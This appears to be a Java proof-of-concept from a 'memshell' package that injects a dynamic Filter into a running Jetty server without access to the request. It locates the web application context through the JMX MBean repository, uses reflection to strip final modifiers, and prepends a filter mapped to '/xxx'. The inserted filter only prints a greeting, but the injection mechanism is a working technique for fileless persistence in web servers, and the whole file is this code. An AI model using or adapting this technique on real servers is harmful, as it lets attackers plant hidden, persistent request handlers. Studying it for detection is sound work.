package com.memshell.jetty;

import com.sun.jmx.mbeanserver.JmxMBeanServer;
import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import org.eclipse.jetty.jmx.MBeanContainer;
import javax.management.ObjectName;
import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.EnumSet;
import java.util.Set;

public class FilterBasedWithoutRequest extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
        // 不管是这种方式拿到的 webAppContext 还是是通过 req.getServletContext() 拿到的 webAppContext
        // 他们的类加载器都是 startJarLoader，不同于 Thread.currentThread().getContextClassLoader()
        // 导致只能通过反射的方式完成整个步骤，否则就会抛 ClassNotFoundException 异常

        try{
            String filterName = "myFilter";

            MBeanContainer mbeanContainer = new MBeanContainer(ManagementFactory.getPlatformMBeanServer());
            JmxMBeanServer mBeanServer = (JmxMBeanServer)mbeanContainer.getMBeanServer();

            Field field = mBeanServer.getClass().getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mBeanServer);

            field = obj.getClass().getDeclaredField("repository");
            field.setAccessible(true);
            Field modifier = field.getClass().getDeclaredField("modifiers");
            modifier.setAccessible(true);
            modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
            Repository repository = (Repository)field.get(obj);

            Set<NamedObject> namedObjectSet = repository.query(new ObjectName("org.eclipse.jetty.webapp:type=webappcontext,*"), null);
            for(NamedObject namedObject : namedObjectSet){
                field = namedObject.getObject().getClass().getSuperclass().getSuperclass().getDeclaredField("_managed");
                field.setAccessible(true);
                modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
                Object webAppContext = field.get(namedObject.getObject());

                field = webAppContext.getClass().getSuperclass().getDeclaredField("_servletHandler");
                field.setAccessible(true);
                Object handler = field.get(webAppContext);

                field = handler.getClass().getDeclaredField("_filters");
                field.setAccessible(true);
                Object[] objects = (Object[]) field.get(handler);

                boolean flag = false;
                for(Object o : objects){
                    field = o.getClass().getSuperclass().getDeclaredField("_name");
                    field.setAccessible(true);
                    String name = (String)field.get(o);
                    if(name.equals(filterName)){
                        flag = true;
                        break;
                    }
                }

                if(!flag){
                    System.out.println("[+] 添加动态 Filter");
                    ClassLoader classLoader = handler.getClass().getClassLoader();

                    Class sourceClazz = null;
                    Object holder = null;
                    try{
                        sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
                        field = sourceClazz.getDeclaredField("JAVAX_API");
                        modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
                        Method method = handler.getClass().getMethod("newFilterHolder", sourceClazz);
                        holder = method.invoke(handler, field.get(null));
                    }catch(ClassNotFoundException e){
                        sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
                        Method method = handler.getClass().getMethod("newFilterHolder", sourceClazz);
                        holder = method.invoke(handler, Enum.valueOf(sourceClazz, "JAVAX_API"));
                    }

                    holder.getClass().getMethod("setName", String.class).invoke(holder, filterName);
                    Filter filter = new Filter() {
                        @Override
                        public void init(FilterConfig filterConfig) throws ServletException {}

                        @Override
                        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
                            System.out.println("Hello, I'm jetty dynamic filter!");
                        }

                        @Override
                        public void destroy() {}
                    };
                    holder.getClass().getMethod("setFilter", Filter.class).invoke(holder, filter);

                    handler.getClass().getMethod("addFilter", holder.getClass()).invoke(handler, holder);

                    Class clazz = classLoader.loadClass("org.eclipse.jetty.servlet.FilterMapping");
                    Object filterMapping = clazz.newInstance();
                    Method method = filterMapping.getClass().getDeclaredMethod("setFilterHolder", holder.getClass());
                    method.setAccessible(true);
                    method.invoke(filterMapping, holder);
                    filterMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(filterMapping, new Object[]{new String[]{"/xxx"}});
                    filterMapping.getClass().getMethod("setDispatcherTypes", EnumSet.class).invoke(filterMapping, EnumSet.of(DispatcherType.REQUEST));

                    // prependFilterMapping 会自动把 filter 加到最前面
                    handler.getClass().getMethod("prependFilterMapping", filterMapping.getClass()).invoke(handler, filterMapping);
                }
            }

            System.out.println("Done!");
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
